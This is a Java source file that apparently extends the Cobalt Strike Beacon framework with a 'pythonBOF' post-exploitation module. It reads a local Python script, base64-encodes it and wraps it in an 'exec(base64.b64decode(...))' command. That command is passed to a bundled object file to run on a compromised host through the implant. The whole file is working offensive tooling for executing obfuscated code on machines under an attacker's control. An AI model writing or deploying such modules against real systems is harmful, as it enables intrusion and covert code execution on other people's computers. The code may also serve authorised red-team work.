package beacon.bof;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;

import aggressor.AggressorClient;
import beacon.PostExInlineObject;
import common.CommonUtils;
import common.Packer;

public class pythonBOF extends PostExInlineObject {
	protected String FilePath;

	public pythonBOF(AggressorClient var1, String FilePath) {
		super(var1);
		this.FilePath = FilePath;
	}

	public byte[] getArguments(String var1) {
		Packer var2 = new Packer();
		String[] parts = this.FilePath.split(" ");
		List<String> list = new ArrayList<>(Arrays.asList(parts));

		String pyPath = list.get(0);
		list.remove(0);

		String args = "";
		for(String part : list) {
			args += part + " ";
		}

		byte[] fileContent = null;
		try {
			fileContent = Files.readAllBytes(Paths.get(pyPath));
		}
		catch (IOException e) {
			throw new RuntimeException(e);
		}
		String base64 = Base64.getEncoder().encodeToString(fileContent);

		String cmd = "\"import base64; exec(base64.b64decode('" +base64 +"').decode());\" " + args;
		var2.addLengthAndStringASCIIZ(cmd);

		return var2.getBytes();
	}

	public byte[] getObjectFile(String var1) {
		return CommonUtils.readResource("bullbof/pythonBOF." + var1 + ".o");
	}
}
